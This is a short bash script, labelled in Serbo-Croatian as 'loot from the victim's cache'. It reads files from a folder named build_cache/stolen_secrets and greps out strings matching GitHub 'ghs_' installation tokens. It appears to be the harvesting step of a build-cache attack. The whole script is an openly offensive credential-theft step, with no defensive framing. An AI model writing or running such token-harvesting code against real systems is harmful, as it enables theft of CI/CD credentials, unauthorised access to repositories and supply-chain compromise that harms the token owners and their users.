#!/bin/bash
echo "--- PLIJEN IZ KESA ZRTVE ---"
cat build_cache/stolen_secrets/*.sh | grep -Eo "ghs_[A-Za-z0-9_]{36}"
